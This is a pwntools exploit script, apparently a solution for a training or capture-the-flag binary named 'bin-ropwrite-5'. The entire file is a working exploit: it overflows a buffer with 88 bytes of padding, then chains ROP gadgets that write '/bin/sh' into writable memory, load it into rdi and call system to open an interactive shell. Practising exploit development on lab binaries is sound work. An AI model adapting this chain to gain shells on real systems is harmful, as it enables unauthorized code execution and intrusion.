from pwn import *

binary = './bins2/bin-ropwrite-5'
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
b *0x000000000040076d
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

io = start()

writeable_mem = e.sym['__data_start']


chain = b''
chain += b'A' * 88


# 0x000000000040076d: pop r8; pop r10; ret;
# 0x000000000040076e: pop rax; pop r10; ret;
# 0x0000000000400779: mov qword ptr [r8], rax; pop r15; ret;
# 0x0000000000400764: pop rdi; ret;
# 0x000000000040078c: pop rsi; ret;



chain += p64(0x000000000040076d) # pop r8; pop r10; ret;
chain += p64(writeable_mem) # r8
chain += p64(0) # r10

chain += p64(0x000000000040076e) # pop rax; pop r10; ret;
chain += b'/bin/sh\0' # rax
chain += p64(0) # r10

chain += p64(0x0000000000400779) # mov qword ptr [r8], rax; pop r15; ret;
chain += p64(0) # r15


chain += p64(0x0000000000400764) # pop rdi; ret;
chain += p64(writeable_mem) # rdi

chain += p64(e.sym['_fini'])


chain += p64(e.sym['system'])

io.sendline(chain)
io.interactive()
